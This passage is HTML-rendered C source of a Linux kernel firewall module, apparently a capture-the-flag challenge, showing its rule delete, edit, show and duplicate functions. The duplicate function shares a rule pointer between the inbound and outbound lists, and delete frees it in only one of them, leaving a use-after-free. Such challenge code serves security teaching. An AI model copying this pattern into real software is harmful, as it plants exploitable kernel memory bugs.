          <td id="file-firewall-c-LC229" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">printk</span>(KERN_ERR <span class="pl-s"><span class="pl-pds">"</span>[Firewall::Info] firewall_add_rule() new rule added!<span class="pl-cce">\n</span><span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L230" class="blob-num js-line-number js-code-nav-line-number" data-line-number="230"></td>
          <td id="file-firewall-c-LC230" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L231" class="blob-num js-line-number js-code-nav-line-number" data-line-number="231"></td>
          <td id="file-firewall-c-LC231" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">return</span> SUCCESS;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L232" class="blob-num js-line-number js-code-nav-line-number" data-line-number="232"></td>
          <td id="file-firewall-c-LC232" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L233" class="blob-num js-line-number js-code-nav-line-number" data-line-number="233"></td>
          <td id="file-firewall-c-LC233" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L234" class="blob-num js-line-number js-code-nav-line-number" data-line-number="234"></td>
          <td id="file-firewall-c-LC234" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L235" class="blob-num js-line-number js-code-nav-line-number" data-line-number="235"></td>
          <td id="file-firewall-c-LC235" class="blob-code blob-code-inner js-file-line"><span class="pl-k">static</span> <span class="pl-k">long</span> <span class="pl-en">firewall_delete_rule</span>(<span class="pl-c1">user_rule_t</span> user_rule, <span class="pl-c1">rule_t</span> **firewall_rules, <span class="pl-c1">uint8_t</span> idx)</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L236" class="blob-num js-line-number js-code-nav-line-number" data-line-number="236"></td>
          <td id="file-firewall-c-LC236" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L237" class="blob-num js-line-number js-code-nav-line-number" data-line-number="237"></td>
          <td id="file-firewall-c-LC237" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">printk</span>(KERN_INFO <span class="pl-s"><span class="pl-pds">"</span>[Firewall::Info] firewall_delete_rule() deleting rule!<span class="pl-cce">\n</span><span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L238" class="blob-num js-line-number js-code-nav-line-number" data-line-number="238"></td>
          <td id="file-firewall-c-LC238" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L239" class="blob-num js-line-number js-code-nav-line-number" data-line-number="239"></td>
          <td id="file-firewall-c-LC239" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span> (firewall_rules[idx] == <span class="pl-c1">NULL</span>)</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L240" class="blob-num js-line-number js-code-nav-line-number" data-line-number="240"></td>
          <td id="file-firewall-c-LC240" class="blob-code blob-code-inner js-file-line">    {</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L241" class="blob-num js-line-number js-code-nav-line-number" data-line-number="241"></td>
          <td id="file-firewall-c-LC241" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">printk</span>(KERN_INFO <span class="pl-s"><span class="pl-pds">"</span>[Firewall::Error] firewall_delete_rule() invalid rule slot!<span class="pl-cce">\n</span><span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L242" class="blob-num js-line-number js-code-nav-line-number" data-line-number="242"></td>
          <td id="file-firewall-c-LC242" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">return</span> ERROR;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L243" class="blob-num js-line-number js-code-nav-line-number" data-line-number="243"></td>
          <td id="file-firewall-c-LC243" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L244" class="blob-num js-line-number js-code-nav-line-number" data-line-number="244"></td>
          <td id="file-firewall-c-LC244" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L245" class="blob-num js-line-number js-code-nav-line-number" data-line-number="245"></td>
          <td id="file-firewall-c-LC245" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">kfree</span>(firewall_rules[idx]);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L246" class="blob-num js-line-number js-code-nav-line-number" data-line-number="246"></td>
          <td id="file-firewall-c-LC246" class="blob-code blob-code-inner js-file-line">    firewall_rules[idx] = <span class="pl-c1">NULL</span>;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L247" class="blob-num js-line-number js-code-nav-line-number" data-line-number="247"></td>
          <td id="file-firewall-c-LC247" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L248" class="blob-num js-line-number js-code-nav-line-number" data-line-number="248"></td>
          <td id="file-firewall-c-LC248" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">return</span> SUCCESS;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L249" class="blob-num js-line-number js-code-nav-line-number" data-line-number="249"></td>
          <td id="file-firewall-c-LC249" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L250" class="blob-num js-line-number js-code-nav-line-number" data-line-number="250"></td>
          <td id="file-firewall-c-LC250" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L251" class="blob-num js-line-number js-code-nav-line-number" data-line-number="251"></td>
          <td id="file-firewall-c-LC251" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L252" class="blob-num js-line-number js-code-nav-line-number" data-line-number="252"></td>
          <td id="file-firewall-c-LC252" class="blob-code blob-code-inner js-file-line"><span class="pl-k">static</span> <span class="pl-k">long</span> <span class="pl-en">firewall_edit_rule</span>(<span class="pl-c1">user_rule_t</span> user_rule, <span class="pl-c1">rule_t</span> **firewall_rules, <span class="pl-c1">uint8_t</span> idx)</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L253" class="blob-num js-line-number js-code-nav-line-number" data-line-number="253"></td>
          <td id="file-firewall-c-LC253" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L254" class="blob-num js-line-number js-code-nav-line-number" data-line-number="254"></td>
          <td id="file-firewall-c-LC254" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">printk</span>(KERN_INFO <span class="pl-s"><span class="pl-pds">"</span>[Firewall::Info] firewall_edit_rule() editing rule!<span class="pl-cce">\n</span><span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L255" class="blob-num js-line-number js-code-nav-line-number" data-line-number="255"></td>
          <td id="file-firewall-c-LC255" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L256" class="blob-num js-line-number js-code-nav-line-number" data-line-number="256"></td>
          <td id="file-firewall-c-LC256" class="blob-code blob-code-inner js-file-line">    #<span class="pl-k">ifdef</span> EASY_MODE</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L257" class="blob-num js-line-number js-code-nav-line-number" data-line-number="257"></td>
          <td id="file-firewall-c-LC257" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">printk</span>(KERN_INFO <span class="pl-s"><span class="pl-pds">"</span>[Firewall::Error] Note that description editing is not implemented.<span class="pl-cce">\n</span><span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L258" class="blob-num js-line-number js-code-nav-line-number" data-line-number="258"></td>
          <td id="file-firewall-c-LC258" class="blob-code blob-code-inner js-file-line">    #<span class="pl-k">endif</span></td>
        </tr>
        <tr>
          <td id="file-firewall-c-L259" class="blob-num js-line-number js-code-nav-line-number" data-line-number="259"></td>
          <td id="file-firewall-c-LC259" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L260" class="blob-num js-line-number js-code-nav-line-number" data-line-number="260"></td>
          <td id="file-firewall-c-LC260" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span> (firewall_rules[idx] == <span class="pl-c1">NULL</span>)</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L261" class="blob-num js-line-number js-code-nav-line-number" data-line-number="261"></td>
          <td id="file-firewall-c-LC261" class="blob-code blob-code-inner js-file-line">    {</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L262" class="blob-num js-line-number js-code-nav-line-number" data-line-number="262"></td>
          <td id="file-firewall-c-LC262" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">printk</span>(KERN_INFO <span class="pl-s"><span class="pl-pds">"</span>[Firewall::Error] firewall_edit_rule() invalid idx!<span class="pl-cce">\n</span><span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L263" class="blob-num js-line-number js-code-nav-line-number" data-line-number="263"></td>
          <td id="file-firewall-c-LC263" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">return</span> ERROR;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L264" class="blob-num js-line-number js-code-nav-line-number" data-line-number="264"></td>
          <td id="file-firewall-c-LC264" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L265" class="blob-num js-line-number js-code-nav-line-number" data-line-number="265"></td>
          <td id="file-firewall-c-LC265" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L266" class="blob-num js-line-number js-code-nav-line-number" data-line-number="266"></td>
          <td id="file-firewall-c-LC266" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memcpy</span>(firewall_rules[idx]-&gt;<span class="pl-smi">iface</span>, user_rule.<span class="pl-smi">iface</span>, <span class="pl-c1">16</span>);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L267" class="blob-num js-line-number js-code-nav-line-number" data-line-number="267"></td>
          <td id="file-firewall-c-LC267" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memcpy</span>(firewall_rules[idx]-&gt;<span class="pl-smi">name</span>, user_rule.<span class="pl-smi">name</span>, <span class="pl-c1">16</span>);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L268" class="blob-num js-line-number js-code-nav-line-number" data-line-number="268"></td>
          <td id="file-firewall-c-LC268" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L269" class="blob-num js-line-number js-code-nav-line-number" data-line-number="269"></td>
          <td id="file-firewall-c-LC269" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span> (<span class="pl-c1">in4_pton</span>(user_rule.<span class="pl-smi">ip</span>, <span class="pl-c1">strnlen</span>(user_rule.<span class="pl-smi">ip</span>, <span class="pl-c1">16</span>), (u8 *)&amp;(firewall_rules[idx]-&gt;<span class="pl-smi">ip</span>), -<span class="pl-c1">1</span>, <span class="pl-c1">NULL</span>) == <span class="pl-c1">0</span>)</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L270" class="blob-num js-line-number js-code-nav-line-number" data-line-number="270"></td>
          <td id="file-firewall-c-LC270" class="blob-code blob-code-inner js-file-line">    {</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L271" class="blob-num js-line-number js-code-nav-line-number" data-line-number="271"></td>
          <td id="file-firewall-c-LC271" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">printk</span>(KERN_ERR <span class="pl-s"><span class="pl-pds">"</span>[Firewall::Error] firewall_edit_rule() invalid IP format!<span class="pl-cce">\n</span><span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L272" class="blob-num js-line-number js-code-nav-line-number" data-line-number="272"></td>
          <td id="file-firewall-c-LC272" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">return</span> ERROR;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L273" class="blob-num js-line-number js-code-nav-line-number" data-line-number="273"></td>
          <td id="file-firewall-c-LC273" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L274" class="blob-num js-line-number js-code-nav-line-number" data-line-number="274"></td>
          <td id="file-firewall-c-LC274" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L275" class="blob-num js-line-number js-code-nav-line-number" data-line-number="275"></td>
          <td id="file-firewall-c-LC275" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span> (<span class="pl-c1">in4_pton</span>(user_rule.<span class="pl-smi">netmask</span>, <span class="pl-c1">strnlen</span>(user_rule.<span class="pl-smi">netmask</span>, <span class="pl-c1">16</span>), (u8 *)&amp;(firewall_rules[idx]-&gt;<span class="pl-smi">netmask</span>), -<span class="pl-c1">1</span>, <span class="pl-c1">NULL</span>) == <span class="pl-c1">0</span>)</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L276" class="blob-num js-line-number js-code-nav-line-number" data-line-number="276"></td>
          <td id="file-firewall-c-LC276" class="blob-code blob-code-inner js-file-line">    {</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L277" class="blob-num js-line-number js-code-nav-line-number" data-line-number="277"></td>
          <td id="file-firewall-c-LC277" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">printk</span>(KERN_ERR <span class="pl-s"><span class="pl-pds">"</span>[Firewall::Error] firewall_edit_rule() invalid Netmask format!<span class="pl-cce">\n</span><span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L278" class="blob-num js-line-number js-code-nav-line-number" data-line-number="278"></td>
          <td id="file-firewall-c-LC278" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">return</span> ERROR;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L279" class="blob-num js-line-number js-code-nav-line-number" data-line-number="279"></td>
          <td id="file-firewall-c-LC279" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L280" class="blob-num js-line-number js-code-nav-line-number" data-line-number="280"></td>
          <td id="file-firewall-c-LC280" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L281" class="blob-num js-line-number js-code-nav-line-number" data-line-number="281"></td>
          <td id="file-firewall-c-LC281" class="blob-code blob-code-inner js-file-line">    firewall_rules[idx]-&gt;<span class="pl-smi">proto</span> = user_rule.<span class="pl-smi">proto</span>;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L282" class="blob-num js-line-number js-code-nav-line-number" data-line-number="282"></td>
          <td id="file-firewall-c-LC282" class="blob-code blob-code-inner js-file-line">    firewall_rules[idx]-&gt;<span class="pl-smi">port</span> = <span class="pl-c1">ntohs</span>(user_rule.<span class="pl-smi">port</span>);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L283" class="blob-num js-line-number js-code-nav-line-number" data-line-number="283"></td>
          <td id="file-firewall-c-LC283" class="blob-code blob-code-inner js-file-line">    firewall_rules[idx]-&gt;<span class="pl-smi">action</span> = user_rule.<span class="pl-smi">action</span>;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L284" class="blob-num js-line-number js-code-nav-line-number" data-line-number="284"></td>
          <td id="file-firewall-c-LC284" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L285" class="blob-num js-line-number js-code-nav-line-number" data-line-number="285"></td>
          <td id="file-firewall-c-LC285" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">printk</span>(KERN_ERR <span class="pl-s"><span class="pl-pds">"</span>[Firewall::Info] firewall_edit_rule() rule edited!<span class="pl-cce">\n</span><span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L286" class="blob-num js-line-number js-code-nav-line-number" data-line-number="286"></td>
          <td id="file-firewall-c-LC286" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L287" class="blob-num js-line-number js-code-nav-line-number" data-line-number="287"></td>
          <td id="file-firewall-c-LC287" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">return</span> SUCCESS;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L288" class="blob-num js-line-number js-code-nav-line-number" data-line-number="288"></td>
          <td id="file-firewall-c-LC288" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L289" class="blob-num js-line-number js-code-nav-line-number" data-line-number="289"></td>
          <td id="file-firewall-c-LC289" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L290" class="blob-num js-line-number js-code-nav-line-number" data-line-number="290"></td>
          <td id="file-firewall-c-LC290" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L291" class="blob-num js-line-number js-code-nav-line-number" data-line-number="291"></td>
          <td id="file-firewall-c-LC291" class="blob-code blob-code-inner js-file-line"><span class="pl-k">static</span> <span class="pl-k">long</span> <span class="pl-en">firewall_show_rule</span>(<span class="pl-c1">user_rule_t</span> user_rule, <span class="pl-c1">rule_t</span> **firewall_rules, <span class="pl-c1">uint8_t</span> idx)</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L292" class="blob-num js-line-number js-code-nav-line-number" data-line-number="292"></td>
          <td id="file-firewall-c-LC292" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L293" class="blob-num js-line-number js-code-nav-line-number" data-line-number="293"></td>
          <td id="file-firewall-c-LC293" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">printk</span>(KERN_INFO <span class="pl-s"><span class="pl-pds">"</span>[Firewall::Error] Function not implemented.<span class="pl-cce">\n</span><span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L294" class="blob-num js-line-number js-code-nav-line-number" data-line-number="294"></td>
          <td id="file-firewall-c-LC294" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">return</span> ERROR;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L295" class="blob-num js-line-number js-code-nav-line-number" data-line-number="295"></td>
          <td id="file-firewall-c-LC295" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L296" class="blob-num js-line-number js-code-nav-line-number" data-line-number="296"></td>
          <td id="file-firewall-c-LC296" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L297" class="blob-num js-line-number js-code-nav-line-number" data-line-number="297"></td>
          <td id="file-firewall-c-LC297" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L298" class="blob-num js-line-number js-code-nav-line-number" data-line-number="298"></td>
          <td id="file-firewall-c-LC298" class="blob-code blob-code-inner js-file-line"><span class="pl-k">static</span> <span class="pl-k">long</span> <span class="pl-en">firewall_dup_rule</span>(<span class="pl-c1">user_rule_t</span> user_rule, <span class="pl-c1">rule_t</span> **firewall_rules, <span class="pl-c1">uint8_t</span> idx)</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L299" class="blob-num js-line-number js-code-nav-line-number" data-line-number="299"></td>
          <td id="file-firewall-c-LC299" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L300" class="blob-num js-line-number js-code-nav-line-number" data-line-number="300"></td>
          <td id="file-firewall-c-LC300" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">uint8_t</span> i;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L301" class="blob-num js-line-number js-code-nav-line-number" data-line-number="301"></td>
          <td id="file-firewall-c-LC301" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">rule_t</span> **<span class="pl-c1">dup</span>;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L302" class="blob-num js-line-number js-code-nav-line-number" data-line-number="302"></td>
          <td id="file-firewall-c-LC302" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L303" class="blob-num js-line-number js-code-nav-line-number" data-line-number="303"></td>
          <td id="file-firewall-c-LC303" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">printk</span>(KERN_INFO <span class="pl-s"><span class="pl-pds">"</span>[Firewall::Info] firewall_dup_rule() duplicating rule!<span class="pl-cce">\n</span><span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L304" class="blob-num js-line-number js-code-nav-line-number" data-line-number="304"></td>
          <td id="file-firewall-c-LC304" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L305" class="blob-num js-line-number js-code-nav-line-number" data-line-number="305"></td>
          <td id="file-firewall-c-LC305" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">dup</span> = (user_rule.<span class="pl-smi">type</span> == INBOUND) ? firewall_rules_out : firewall_rules_in;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L306" class="blob-num js-line-number js-code-nav-line-number" data-line-number="306"></td>
          <td id="file-firewall-c-LC306" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L307" class="blob-num js-line-number js-code-nav-line-number" data-line-number="307"></td>
          <td id="file-firewall-c-LC307" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span> (firewall_rules[idx] == <span class="pl-c1">NULL</span>)</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L308" class="blob-num js-line-number js-code-nav-line-number" data-line-number="308"></td>
          <td id="file-firewall-c-LC308" class="blob-code blob-code-inner js-file-line">    {</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L309" class="blob-num js-line-number js-code-nav-line-number" data-line-number="309"></td>
          <td id="file-firewall-c-LC309" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">printk</span>(KERN_INFO <span class="pl-s"><span class="pl-pds">"</span>[Firewall::Error] firewall_dup_rule() nothing to duplicate!<span class="pl-cce">\n</span><span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L310" class="blob-num js-line-number js-code-nav-line-number" data-line-number="310"></td>
          <td id="file-firewall-c-LC310" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">return</span> ERROR;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L311" class="blob-num js-line-number js-code-nav-line-number" data-line-number="311"></td>
          <td id="file-firewall-c-LC311" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L312" class="blob-num js-line-number js-code-nav-line-number" data-line-number="312"></td>
          <td id="file-firewall-c-LC312" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L313" class="blob-num js-line-number js-code-nav-line-number" data-line-number="313"></td>
          <td id="file-firewall-c-LC313" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span> (firewall_rules[idx]-&gt;<span class="pl-smi">is_duplicated</span>)</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L314" class="blob-num js-line-number js-code-nav-line-number" data-line-number="314"></td>
          <td id="file-firewall-c-LC314" class="blob-code blob-code-inner js-file-line">    {</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L315" class="blob-num js-line-number js-code-nav-line-number" data-line-number="315"></td>
          <td id="file-firewall-c-LC315" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">printk</span>(KERN_INFO <span class="pl-s"><span class="pl-pds">"</span>[Firewall::Info] firewall_dup_rule() rule already duplicated before!<span class="pl-cce">\n</span><span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L316" class="blob-num js-line-number js-code-nav-line-number" data-line-number="316"></td>
          <td id="file-firewall-c-LC316" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">return</span> ERROR;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L317" class="blob-num js-line-number js-code-nav-line-number" data-line-number="317"></td>
          <td id="file-firewall-c-LC317" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L318" class="blob-num js-line-number js-code-nav-line-number" data-line-number="318"></td>
          <td id="file-firewall-c-LC318" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L319" class="blob-num js-line-number js-code-nav-line-number" data-line-number="319"></td>
          <td id="file-firewall-c-LC319" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">for</span> (i = <span class="pl-c1">0</span>; i &lt; MAX_RULES; i++)</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L320" class="blob-num js-line-number js-code-nav-line-number" data-line-number="320"></td>
          <td id="file-firewall-c-LC320" class="blob-code blob-code-inner js-file-line">    {</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L321" class="blob-num js-line-number js-code-nav-line-number" data-line-number="321"></td>
          <td id="file-firewall-c-LC321" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> (<span class="pl-c1">dup</span>[i] == <span class="pl-c1">NULL</span>)</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L322" class="blob-num js-line-number js-code-nav-line-number" data-line-number="322"></td>
          <td id="file-firewall-c-LC322" class="blob-code blob-code-inner js-file-line">        {</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L323" class="blob-num js-line-number js-code-nav-line-number" data-line-number="323"></td>
          <td id="file-firewall-c-LC323" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">dup</span>[i] = firewall_rules[idx];</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L324" class="blob-num js-line-number js-code-nav-line-number" data-line-number="324"></td>
          <td id="file-firewall-c-LC324" class="blob-code blob-code-inner js-file-line">            firewall_rules[idx]-&gt;<span class="pl-smi">is_duplicated</span> = <span class="pl-c1">1</span>;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L325" class="blob-num js-line-number js-code-nav-line-number" data-line-number="325"></td>
          <td id="file-firewall-c-LC325" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">printk</span>(KERN_INFO <span class="pl-s"><span class="pl-pds">"</span>[Firewall::Info] firewall_dup_rule() rule duplicated!<span class="pl-cce">\n</span><span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L326" class="blob-num js-line-number js-code-nav-line-number" data-line-number="326"></td>
          <td id="file-firewall-c-LC326" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">return</span> SUCCESS;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L327" class="blob-num js-line-number js-code-nav-line-number" data-line-number="327"></td>
          <td id="file-firewall-c-LC327" class="blob-code blob-code-inner js-file-line">        }</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L328" class="blob-num js-line-number js-code-nav-line-number" data-line-number="328"></td>
          <td id="file-firewall-c-LC328" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L329" class="blob-num js-line-number js-code-nav-line-number" data-line-number="329"></td>
          <td id="file-firewall-c-LC329" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L330" class="blob-num js-line-number js-code-nav-line-number" data-line-number="330"></td>
          <td id="file-firewall-c-LC330" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">printk</span>(KERN_INFO <span class="pl-s"><span class="pl-pds">"</span>[Firewall::Error] firewall_dup_rule() nowhere to duplicate!<span class="pl-cce">\n</span><span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L331" class="blob-num js-line-number js-code-nav-line-number" data-line-number="331"></td>
          <td id="file-firewall-c-LC331" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L332" class="blob-num js-line-number js-code-nav-line-number" data-line-number="332"></td>
          <td id="file-firewall-c-LC332" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">return</span> ERROR;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L333" class="blob-num js-line-number js-code-nav-line-number" data-line-number="333"></td>
          <td id="file-firewall-c-LC333" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L334" class="blob-num js-line-number js-code-nav-line-number" data-line-number="334"></td>
          <td id="file-firewall-c-LC334" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L335" class="blob-num js-line-number js-code-nav-line-number" data-line-number="335"></td>
          <td id="file-firewall-c-LC335" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L336" class="blob-num js-line-number js-code-nav-line-number" data-line-number="336"></td>
          <td id="file-firewall-c-LC336" class="blob-code blob-code-inner js-file-line"><span class="pl-k">static</span> <span class="pl-c1">uint32_t</span> <span class="pl-en">process_rule</span>(<span class="pl-k">struct</span> sk_buff *skb, <span class="pl-c1">rule_t</span> *rule, <span class="pl-c1">uint8_t</span> type, <span class="pl-k">int</span> i)</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L337" class="blob-num js-line-number js-code-nav-line-number" data-line-number="337"></td>
          <td id="file-firewall-c-LC337" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L338" class="blob-num js-line-number js-code-nav-line-number" data-line-number="338"></td>
          <td id="file-firewall-c-LC338" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">struct</span> iphdr *iph;</td>
        </tr>
        <tr>
